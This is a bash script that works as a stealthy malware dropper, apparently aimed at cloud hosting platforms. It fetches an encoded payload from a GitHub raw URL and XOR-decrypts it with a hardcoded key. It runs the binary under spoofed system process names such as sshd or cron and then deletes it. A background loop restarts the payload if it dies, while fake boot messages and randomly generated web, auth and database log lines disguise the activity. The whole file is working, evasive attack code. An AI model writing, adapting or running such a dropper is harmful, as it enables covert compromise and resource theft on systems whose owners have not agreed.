#!/bin/bash
LOG_INTERVAL=${LOG_INTERVAL:-15}
MONITOR_INTERVAL=${MONITOR_INTERVAL:-60}
LINES_PER_BATCH=${LINES_PER_BATCH:-2}
rand_sleep() {
local base=$((RANDOM % 8 + 1))
[ $((RANDOM % 7)) -eq 0 ] && base=$((RANDOM % 20 + 10))
sleep "$(echo "$base * 0.1" | bc 2>/dev/null || echo "1")" 2>/dev/null || sleep 1
}
generate_log() {
local ts=$(date +'%Y-%m-%dT%H:%M:%S.%3N%z')
local p=$((RANDOM % 5))
local ip="10.$(shuf -i 0-255 -n1).$(shuf -i 0-255 -n1).$(shuf -i 0-255 -n1)"
local status=$(shuf -e 200 201 204 301 302 400 401 403 404 500 502 -n1)
local method=$(shuf -e GET POST PUT DELETE PATCH HEAD -n1)
local path=$(shuf -e "/api/v1/users" "/orders/status" "/payments/callback" "/health" "/metrics" "/assets/main.js" "/login" "/logout" -n1)
local agent=$(shuf -e "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)" "python-requests/2.28.1" "curl/7.88.1" -n1)
case $p in
0) echo "$ts web.1 - $method $path HTTP/1.1 $status $((RANDOM % 5000 + 100)) \"-\" \"$agent\" $((RANDOM % 15000 + 50))ms" ;;
1) local job_id=$(openssl rand -hex 6 2>/dev/null || echo "job_$RANDOM")
echo "$ts worker.1 [INFO] Job $job_id done in $((RANDOM % 450 + 10))ms. Queue: $((RANDOM % 200)). OK" ;;
2) local table=$(shuf -e "users_sessions" "inventory" "order_lines" "event_store" "metadata_cache" -n1)
echo "$ts db-analyzer ⏳ $table ($((RANDOM % 90000 + 1000))) | hit $((RANDOM % 35 + 60))% | lag $((RANDOM % 3))s" ;;
3) local user=$(shuf -e "admin" "deploy" "svc-acc" "user_$RANDOM" -n1)
[ $((RANDOM % 5)) -eq 0 ] && echo "$ts auth.1 ⚠️ FAIL $user from $ip" || echo "$ts auth.1 ✅ OK $user from $ip" ;;
4) local svc=$(shuf -e "payment" "shipping" "notif" "rec" -n1)
echo "$ts ${svc}.1 {\"level\":\"info\",\"lat\":$((RANDOM % 300 + 20)),\"span\":\"$(openssl rand -hex 4 2>/dev/null || echo $RANDOM)\",\"msg\":\"$((RANDOM % 50)) items\"}" ;;
esac
}
fetch_payload() {
local ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/$(shuf -i 100-120 -n1).0.$(shuf -i 4000-6000 -n1).$(shuf -i 100-200 -n1) Safari/537.36"
local primary="https://raw.githubusercontent.com/serukinaba/natalya/refs/heads/main/payload.txt"
_PAYLOAD=$(curl -sL --max-time 25 --user-agent "$ua" "$primary" 2>/dev/null || true)
if [ -z "$_PAYLOAD" ]; then
sleep $((RANDOM % 4 + 1))
ua="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/$(shuf -i 15-17 -n1).0 Safari/605.1.15"
_PAYLOAD=$(curl -sL --max-time 25 --user-agent "$ua" "$primary" 2>/dev/null || true)
fi
if [ -z "$_PAYLOAD" ]; then
echo "gagal (fetch)" >&2
exit 1
fi
}
launch_payload() {
local RAND_BIN=$(openssl rand -hex 4 2>/dev/null || printf "%08x" $RANDOM)
export RAND_BIN
DECRYPT_ERR=$(printf '%s' "$_PAYLOAD" | python3 -c '
import base64, os, sys, traceback
try:
    data = sys.stdin.read()
    if not data:
        print("ERROR: data kosong", file=sys.stderr)
        sys.exit(1)
    data = data.strip()
    decoded = base64.b64decode(data)
    key = "sederolandusiaen234YbdjenJFBejbFtyefbiFyuwksfFYUBkeu"
    decrypted = bytes([decoded[i] ^ ord(key[i % len(key)]) for i in range(len(decoded))])
    if len(decrypted) < 100:
        print(f"ERROR: size too small ({len(decrypted)})", file=sys.stderr)
        sys.exit(1)
    fname = os.environ.get("RAND_BIN", "nnr")
    with open(fname, "wb") as f: f.write(decrypted)
    os.chmod(fname, 0o755)
except base64.binascii.Error as e:
    print(f"ERROR BASE64: {e}", file=sys.stderr)
    sys.exit(1)
except Exception as e:
    print(f"ERROR: {e}", file=sys.stderr)
    traceback.print_exc(file=sys.stderr)
    sys.exit(1)
' 2>&1)
if [ $? -ne 0 ] || [ ! -x "./$RAND_BIN" ]; then
echo "gagal (decrypt) - $DECRYPT_ERR" >&2
exit 1
fi
local PROC_NAMES=("systemd-logind" "dbus-daemon" "polkitd" "sshd" "cron" "atd" "ntpd" "rsyslogd" "journald" "udisksd")
local PROC_NAME=${PROC_NAMES[$((RANDOM % ${#PROC_NAMES[@]}))]}
exec -a "$PROC_NAME" "./$RAND_BIN" -j 4 > /dev/null 2>&1 &
local pid=$!
sleep 1
if kill -0 $pid 2>/dev/null; then
rm -f "./$RAND_BIN" 2>/dev/null || true
echo $pid
return 0
fi
exec -a "$PROC_NAME" "./$RAND_BIN" > /dev/null 2>&1 &
pid=$!
sleep 1
if kill -0 $pid 2>/dev/null; then
rm -f "./$RAND_BIN" 2>/dev/null || true
echo $pid
return 0
fi
echo "gagal (exec)" >&2
rm -f "./$RAND_BIN" 2>/dev/null || true
exit 1
}
fake_init() {
local dyno=$(shuf -e "web" "worker" "scheduler" "release" -n1)
local dyno_id=$(openssl rand -hex 4 2>/dev/null || echo $RANDOM)
echo "[$(date +'%Y-%m-%dT%H:%M:%S.%3N%z')] $dyno.1 boot $dyno_id (ram $((RANDOM % 512 + 256))MB)"
sleep $((RANDOM % 3 + 1))
echo "[$(date +'%Y-%m-%dT%H:%M:%S.%3N%z')] $dyno.1 listening on ${PORT:-8080} (PID: $$)"
sleep $((RANDOM % 2 + 1))
echo "[$(date +'%Y-%m-%dT%H:%M:%S.%3N%z')] $dyno.1 redis cluster $((RANDOM % 10 + 1)) nodes"
sleep $((RANDOM % 2))
echo "[$(date +'%Y-%m-%dT%H:%M:%S.%3N%z')] $dyno.1 ready (ver: $(shuf -e v2.3.4 v3.0.1 v4.2.7 v5.0.0-rc -n1))"
}
sleep $((RANDOM % 15 + 1))
fetch_payload
PAYLOAD_PID=$(launch_payload)
if [ -z "$PAYLOAD_PID" ] || [ "$PAYLOAD_PID" -eq 0 ]; then
echo "gagal (no PID)" >&2
exit 1
fi
fake_init
(
while true; do
sleep $MONITOR_INTERVAL
if kill -0 "$PAYLOAD_PID" 2>/dev/null; then
continue
else
echo "[WARN] Payload died, restart..." >&2
fetch_payload
NEW_PID=$(launch_payload)
if [ -n "$NEW_PID" ] && [ "$NEW_PID" -gt 0 ]; then
PAYLOAD_PID=$NEW_PID
echo "[INFO] Restartd with PID $PAYLOAD_PID" >&2
else
echo "gagal (restart)" >&2
exit 1
fi
fi
done
) &
while true; do
lines=$((RANDOM % LINES_PER_BATCH + 1))
for ((i=0; i<lines; i++)); do
generate_log
done
if [ $((RANDOM % 10)) -eq 0 ]; then
echo "$(date +'%Y-%m-%dT%H:%M:%S.%3N%z') heroku/router - at=info method=GET path=/ host=app-$((RANDOM % 999)).herokuapp.com request_id=$(openssl rand -hex 8 2>/dev/null || echo $RANDOM) fwd=\"$((RANDOM % 255)).$((RANDOM % 255)).$((RANDOM % 255)).$((RANDOM % 255))\" dyno=web.$((RANDOM % 10)) connect=$((RANDOM % 5))ms service=$((RANDOM % 80 + 20))ms status=$((RANDOM % 400 + 200)) bytes=$((RANDOM % 5000 + 500)) protocol=https"
fi
wait_time=$((LOG_INTERVAL + RANDOM % (LOG_INTERVAL/2) - LOG_INTERVAL/4))
[ $wait_time -lt 2 ] && wait_time=2
sleep $wait_time
done
